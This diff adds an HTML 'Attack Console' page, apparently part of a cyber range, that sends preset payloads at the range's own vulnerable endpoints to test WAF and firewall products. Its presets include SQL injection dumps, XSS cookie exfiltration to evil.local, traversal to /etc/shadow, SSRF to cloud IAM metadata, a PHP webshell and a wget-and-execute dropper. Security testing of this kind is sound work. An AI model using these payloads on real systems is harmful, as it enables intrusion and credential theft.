@@ -1,0 +1,381 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+  <title>Attack Console</title>
+  <link rel="stylesheet" href="/app.css"/>
+  <style>
+    .tabs { display:flex; gap:6px; flex-wrap:wrap; margin-bottom:14px; }
+    .tab  { padding:8px 14px; border:1px solid var(--line); border-radius:8px;
+            background:var(--panel); cursor:pointer; font-size:0.9rem; color:var(--muted); }
+    .tab.active { border-color:var(--brand); color:var(--brand); background:#eef4fb; font-weight:600; }
+    .pane { display:none; } .pane.active { display:block; }
+    .attack-grid { display:grid; grid-template-columns:1fr 1fr; gap:14px; }
+    @media(max-width:800px){ .attack-grid{ grid-template-columns:1fr; } }
+    textarea { height:80px; resize:vertical; font-family:monospace; font-size:0.85rem; }
+    .status-badge { display:inline-block; padding:4px 10px; border-radius:100px;
+                    font-size:0.82rem; font-weight:700; margin-bottom:8px; }
+    .status-200  { background:#d4edda; color:#155724; }
+    .status-403  { background:#f8d7da; color:#721c24; }
+    .status-err  { background:#fff3cd; color:#856404; }
+    .status-none { background:#e2e3e5; color:#383d41; }
+    .result-header { display:flex; align-items:center; gap:10px; margin-bottom:8px; }
+    pre { font-size:0.82rem; }
+    label { display:block; margin-bottom:4px; font-size:0.85rem; font-weight:600; color:var(--muted); }
+    select { width:100%; padding:8px; border-radius:8px; border:1px solid var(--line); font-size:0.9rem; margin-bottom:10px; }
+    .tip { font-size:0.8rem; color:var(--muted); margin-top:6px; }
+  </style>
+</head>
+<body>
+<div class="shell">
+  <div class="topbar">
+    <div class="brand">Cyber Range Control Plane</div>
+    <div class="nav">
+      <a href="/index.html">Home</a>
+      <a href="/dashboard.html">Dashboard</a>
+      <a href="/attacks.html" class="active">Attack Console</a>
+      <a href="/controls.html">Security Controls</a>
+      <a href="/events.html">Events</a>
+    </div>
+  </div>
+
+  <div class="hero">
+    <h1>Attack Console</h1>
+    <p>Fire real attack payloads against this vulnerable target. Without external security controls (CFW/WAF/IPS), every attack succeeds. Enable your real products to see blocking in action.</p>
+  </div>
+
+  <div class="card" style="margin-bottom:14px;">
+    <div class="row" style="align-items:end;">
+      <div>
+        <label>Attacker VM Label</label>
+        <input id="sourceVm" value="attacker-vm-01"/>
+      </div>
+      <div>
+        <label>Target Base URL</label>
+        <input id="targetBase" value=""/>
+        <div class="tip">Leave blank to use current host. Set to attacker-vm target URL for cross-VM tests.</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="tabs">
+    <div class="tab active" onclick="switchTab('sqli')">SQL Injection</div>
+    <div class="tab" onclick="switchTab('xss')">XSS</div>
+    <div class="tab" onclick="switchTab('traversal')">Path Traversal</div>
+    <div class="tab" onclick="switchTab('exec')">Command Injection</div>
+    <div class="tab" onclick="switchTab('auth')">Auth Bypass</div>
+    <div class="tab" onclick="switchTab('ssrf')">SSRF</div>
+    <div class="tab" onclick="switchTab('upload')">File Upload</div>
+    <div class="tab" onclick="switchTab('info')">Info Disclosure</div>
+  </div>
+
+  <!-- SQLi -->
+  <div id="pane-sqli" class="pane active attack-grid">
+    <div class="card">
+      <div class="label">SQL Injection — /vuln/sqli</div>
+      <h3>Attack Parameters</h3>
+      <label>Preset payload</label>
+      <select onchange="document.getElementById('sqliQ').value=this.value">
+        <option value="1">Normal query (q=1)</option>
+        <option value="' OR 1=1 --">' OR 1=1 -- (Auth bypass)</option>
+        <option value="1 UNION SELECT username,password_hash,email,api_key,role FROM users --">UNION SELECT dump all</option>
+        <option value="1' AND SLEEP(5) --">Blind time-based</option>
+        <option value="1 OR '1'='1">Boolean-based blind</option>
+      </select>
+      <label>Query parameter (q=)</label>
+      <textarea id="sqliQ">' OR 1=1 --</textarea>
+      <button style="margin-top:8px;" onclick="fireSqli()">Fire SQLi Attack</button>
+    </div>
+    <div class="card">
+      <div class="label">Response</div>
+      <div class="result-header">
+        <span class="status-badge status-none" id="sqli-badge">—</span>
+        <span id="sqli-desc">Waiting...</span>
+      </div>
+      <pre id="sqli-out">{}</pre>
+    </div>
+  </div>
+
+  <!-- XSS -->
+  <div id="pane-xss" class="pane attack-grid">
+    <div class="card">
+      <div class="label">Cross-Site Scripting — /vuln/xss</div>
+      <h3>Attack Parameters</h3>
+      <label>Preset payload</label>
+      <select onchange="document.getElementById('xssIn').value=this.value">
+        <option value="<script>alert('XSS')</script>">Basic alert XSS</option>
+        <option value="<img src=x onerror=alert(1)>">img onerror</option>
+        <option value="<svg onload=alert(document.cookie)>">SVG cookie steal</option>
+        <option value="<body onload=alert(1)>">body onload</option>
+        <option value="&lt;script&gt;fetch('http://evil.local/?c='+document.cookie)&lt;/script&gt;">Cookie exfil (encoded)</option>
+      </select>
+      <label>Input reflected in HTML response</label>
+      <textarea id="xssIn"><script>alert('XSS')</script></textarea>
+      <button style="margin-top:8px;" onclick="fireXss()">Fire XSS Attack</button>
+      <div class="tip">Without WAF: browser renders the injected payload. With WAF enforce: 403 or sanitised response.</div>
+    </div>
+    <div class="card">
+      <div class="label">Response</div>
+      <div class="result-header">
+        <span class="status-badge status-none" id="xss-badge">—</span>
+        <span id="xss-desc">Waiting...</span>
+      </div>
+      <pre id="xss-out">{}</pre>
+    </div>
+  </div>
+
+  <!-- Traversal -->
+  <div id="pane-traversal" class="pane attack-grid">
+    <div class="card">
+      <div class="label">Path Traversal — /vuln/traversal</div>
+      <h3>Attack Parameters</h3>
+      <label>Preset path</label>
+      <select onchange="document.getElementById('travPath').value=this.value">
+        <option value="../../../../etc/passwd">../../../../etc/passwd</option>
+        <option value="../../../../etc/shadow">../../../../etc/shadow</option>
+        <option value="../../../../etc/hosts">../../../../etc/hosts</option>
+        <option value="../../../../proc/version">../../../../proc/version</option>
+        <option value="../../../../app/config.yaml">../../../../app/config.yaml</option>
+        <option value="%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd">URL-encoded traversal</option>
+      </select>
+      <label>File path</label>
+      <textarea id="travPath">../../../../etc/passwd</textarea>
+      <button style="margin-top:8px;" onclick="fireTraversal()">Fire Traversal</button>
+    </div>
+    <div class="card">
+      <div class="label">Response</div>
+      <div class="result-header">
+        <span class="status-badge status-none" id="trav-badge">—</span>
+        <span id="trav-desc">Waiting...</span>
+      </div>
+      <pre id="trav-out">{}</pre>
+    </div>
+  </div>
+
+  <!-- Exec -->
+  <div id="pane-exec" class="pane attack-grid">
+    <div class="card">
+      <div class="label">Command Injection — /vuln/exec</div>
+      <h3>Attack Parameters</h3>
+      <label>Preset command</label>
+      <select onchange="document.getElementById('execCmd').value=this.value">
+        <option value="id">id (check uid)</option>
+        <option value="whoami">whoami</option>
+        <option value="hostname">hostname</option>
+        <option value="uname -a">uname -a (kernel info)</option>
+        <option value="env">env (environment vars / secrets)</option>
+        <option value="ps aux">ps aux (running processes)</option>
+        <option value="netstat -tlnp">netstat -tlnp (open ports)</option>
+        <option value="ls /">ls / (filesystem root)</option>
+      </select>
+      <label>Command</label>
+      <textarea id="execCmd">id</textarea>
+      <button style="margin-top:8px;" onclick="fireExec()">Execute Command</button>
+    </div>
+    <div class="card">
+      <div class="label">Response</div>
+      <div class="result-header">
+        <span class="status-badge status-none" id="exec-badge">—</span>
+        <span id="exec-desc">Waiting...</span>
+      </div>
+      <pre id="exec-out">{}</pre>
+    </div>
+  </div>
+
+  <!-- Auth -->
+  <div id="pane-auth" class="pane attack-grid">
+    <div class="card">
+      <div class="label">Auth Bypass — /vuln/auth</div>
+      <h3>Attack Parameters</h3>
+      <label>Username</label>
+      <input id="authUser" value="admin"/>
+      <label>Password (any value — bypass always succeeds)</label>
+      <input id="authPass" value="wrongpassword"/>
+      <button style="margin-top:8px;" onclick="fireAuth()">Attempt Login</button>
+      <div class="tip">Without real auth control: session token is always issued. With host security / WAAP enforce: request blocked.</div>
+    </div>
+    <div class="card">
+      <div class="label">Response</div>
+      <div class="result-header">
+        <span class="status-badge status-none" id="auth-badge">—</span>
+        <span id="auth-desc">Waiting...</span>
+      </div>
+      <pre id="auth-out">{}</pre>
+    </div>
+  </div>
+
+  <!-- SSRF -->
+  <div id="pane-ssrf" class="pane attack-grid">
+    <div class="card">
+      <div class="label">SSRF — /vuln/ssrf</div>
+      <h3>Attack Parameters</h3>
+      <label>Preset target</label>
+      <select onchange="document.getElementById('ssrfUrl').value=this.value">
+        <option value="http://169.254.169.254/latest/meta-data/">Cloud metadata (169.254.169.254)</option>
+        <option value="http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role">IAM credentials</option>
+        <option value="http://10.0.2.50:8500/v1/kv/">Internal Consul KV store</option>
+        <option value="http://10.0.1.100:5432">Internal DB port</option>
+      </select>
+      <label>Target URL</label>
+      <textarea id="ssrfUrl">http://169.254.169.254/latest/meta-data/</textarea>
+      <button style="margin-top:8px;" onclick="fireSsrf()">Fire SSRF Request</button>
+    </div>
+    <div class="card">
+      <div class="label">Response</div>
+      <div class="result-header">
+        <span class="status-badge status-none" id="ssrf-badge">—</span>
+        <span id="ssrf-desc">Waiting...</span>
+      </div>
+      <pre id="ssrf-out">{}</pre>
+    </div>
+  </div>
+
+  <!-- Upload -->
+  <div id="pane-upload" class="pane attack-grid">
+    <div class="card">
+      <div class="label">Malicious File Upload — /vuln/upload</div>
+      <h3>Attack Parameters</h3>
+      <label>Preset file type</label>
+      <select id="uploadPreset" onchange="applyUploadPreset()">
+        <option value="eicar">EICAR AV test string</option>
+        <option value="webshell">PHP webshell snippet</option>
+        <option value="script">Dropper script</option>
+        <option value="clean">Clean text file</option>
+      </select>
+      <label>Filename</label>
+      <input id="uploadName" value="eicar-test.com.txt"/>
+      <label>Content (text — sent as base64)</label>
+      <textarea id="uploadContent">X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*</textarea>
+      <button style="margin-top:8px;" onclick="fireUpload()">Upload File</button>
+    </div>
+    <div class="card">
+      <div class="label">Response</div>
+      <div class="result-header">
+        <span class="status-badge status-none" id="upload-badge">—</span>
+        <span id="upload-desc">Waiting...</span>
+      </div>
+      <pre id="upload-out">{}</pre>
+    </div>
+  </div>
+
+  <!-- Info -->
+  <div id="pane-info" class="pane attack-grid">
+    <div class="card">
+      <div class="label">Information Disclosure — /vuln/info</div>
+      <h3>Attack Parameters</h3>
+      <p style="color:var(--muted);font-size:0.9rem;margin-bottom:14px;">GET request to /vuln/info returns server config, internal IPs, debug flags, and echoed request headers — simulating a misconfigured debug endpoint.</p>
+      <button onclick="fireInfo()">Probe Info Endpoint</button>
+    </div>
+    <div class="card">
+      <div class="label">Response</div>
+      <div class="result-header">
+        <span class="status-badge status-none" id="info-badge">—</span>
+        <span id="info-desc">Waiting...</span>
+      </div>
+      <pre id="info-out">{}</pre>
+    </div>
+  </div>
+
+</div>
+
+<script src="/app.js"></script>
+<script>
+function base() {
+  const b = document.getElementById("targetBase").value.trim();
+  return b || "";
+}
+function svm() { return document.getElementById("sourceVm").value.trim() || "attacker-vm"; }
+
+function switchTab(name) {
+  document.querySelectorAll(".tab").forEach((t,i) => {
+    const names = ["sqli","xss","traversal","exec","auth","ssrf","upload","info"];
+    t.classList.toggle("active", names[i] === name);
+  });
+  document.querySelectorAll(".pane").forEach(p => p.classList.remove("active"));
+  document.getElementById("pane-"+name).classList.add("active");
+}
+
+async function doRequest(method, url, body, badgeId, descId, outId) {
+  const badge = document.getElementById(badgeId);
+  const desc  = document.getElementById(descId);
+  const out   = document.getElementById(outId);
+  badge.className = "status-badge status-none"; badge.textContent = "...";
+  desc.textContent = "Sending..."; out.textContent = "";
+  try {
+    const opts = { method, headers: { Accept: "application/json,text/html,*/*" } };
+    if (body) { opts.headers["Content-Type"] = "application/json"; opts.body = JSON.stringify(body); }
+    const res = await fetch(base() + url, opts);
+    const ct = res.headers.get("content-type") || "";
+    let text;
+    if (ct.includes("application/json")) {
+      const d = await res.json(); text = JSON.stringify(d, null, 2);
+    } else {
+      text = await res.text();
+    }
+    badge.className = "status-badge status-" + (res.ok ? "200" : "403");
+    badge.textContent = "HTTP " + res.status;
+    if (res.ok) {
+      desc.textContent = "Request reached the app. No external control blocked it.";
+    } else {
+      desc.textContent = "Blocked — an external security control (WAF/IPS/CFW) rejected this request.";
+    }
+    out.textContent = text;
+  } catch(e) {
+    badge.className = "status-badge status-err"; badge.textContent = "ERR";
+    desc.textContent = "Network error or blocked at TCP layer: " + e.message;
+    out.textContent = e.toString();
+  }
+}
+
+function fireSqli() {
+  const q = document.getElementById("sqliQ").value;
+  doRequest("POST","/vuln/sqli",{q,source_vm:svm()},"sqli-badge","sqli-desc","sqli-out");
+}
+function fireXss() {
+  const input = document.getElementById("xssIn").value;
+  doRequest("POST","/vuln/xss",{input,source_vm:svm()},"xss-badge","xss-desc","xss-out");
+}
+function fireTraversal() {
+  const path = document.getElementById("travPath").value;
+  doRequest("POST","/vuln/traversal",{path,source_vm:svm()},"trav-badge","trav-desc","trav-out");
+}
+function fireExec() {
+  const cmd = document.getElementById("execCmd").value;
+  doRequest("POST","/vuln/exec",{cmd,source_vm:svm()},"exec-badge","exec-desc","exec-out");
+}
+function fireAuth() {
+  const username = document.getElementById("authUser").value;
+  const password = document.getElementById("authPass").value;
+  doRequest("POST","/vuln/auth",{username,password,source_vm:svm()},"auth-badge","auth-desc","auth-out");
+}
+function fireSsrf() {
+  const url = document.getElementById("ssrfUrl").value;
+  doRequest("POST","/vuln/ssrf",{url,source_vm:svm()},"ssrf-badge","ssrf-desc","ssrf-out");
+}
+function fireUpload() {
+  const filename = document.getElementById("uploadName").value;
+  const text = document.getElementById("uploadContent").value;
+  const content_base64 = btoa(unescape(encodeURIComponent(text)));
+  doRequest("POST","/vuln/upload",{filename,content_base64,source_vm:svm()},"upload-badge","upload-desc","upload-out");
+}
+function fireInfo() {
+  doRequest("GET","/vuln/info?source_vm="+encodeURIComponent(svm()),null,"info-badge","info-desc","info-out");
+}
+
+function applyUploadPreset() {
+  const v = document.getElementById("uploadPreset").value;
+  const presets = {
+    eicar:    {name:"eicar-test.com.txt", content:"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"},
+    webshell: {name:"shell.php", content:"<?php if(isset($_GET['cmd'])){ echo shell_exec($_GET['cmd']); } ?>"},
+    script:   {name:"dropper.sh", content:"#!/bin/sh\nwget http://evil.local/payload -O /tmp/x ; chmod +x /tmp/x ; /tmp/x"},
+    clean:    {name:"readme.txt", content:"This is a clean text file."},
+  };
+  if (presets[v]) {
+    document.getElementById("uploadName").value = presets[v].name;
+    document.getElementById("uploadContent").value = presets[v].content;
+  }
+}
+</script>
+</body>
+</html>
